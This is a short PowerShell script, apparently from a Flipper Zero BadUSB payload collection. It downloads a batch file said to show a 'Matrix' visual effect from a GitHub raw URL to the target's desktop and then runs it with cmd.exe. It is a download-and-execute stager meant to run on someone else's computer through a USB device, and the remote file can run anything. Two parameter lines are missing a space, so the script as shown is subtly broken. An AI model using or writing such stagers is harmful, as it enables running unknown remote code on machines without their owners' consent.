<#
    Author: KneBellx
    Description: Downloads and launches the Matrix visual effect script on the target system.
    Version: 1.0.0
#>

# Define paths
$DesktopPath = [Environment]::GetFolderPath("Desktop")
$OutputFile = Join-Path -Path$DesktopPath -ChildPath "matrix.bat"

# Download payload from KneBellx repository
$ScriptUrl = "https://raw.githubusercontent.com/KneBellx/flipper-zero-badusb/main/utils/files/matrix.bat"
Invoke-WebRequest -Uri $ScriptUrl -OutFile$OutputFile -UseBasicParsing

# Execute the downloaded batch file
Start-Process "cmd.exe" -ArgumentList "/c `"$OutputFile`""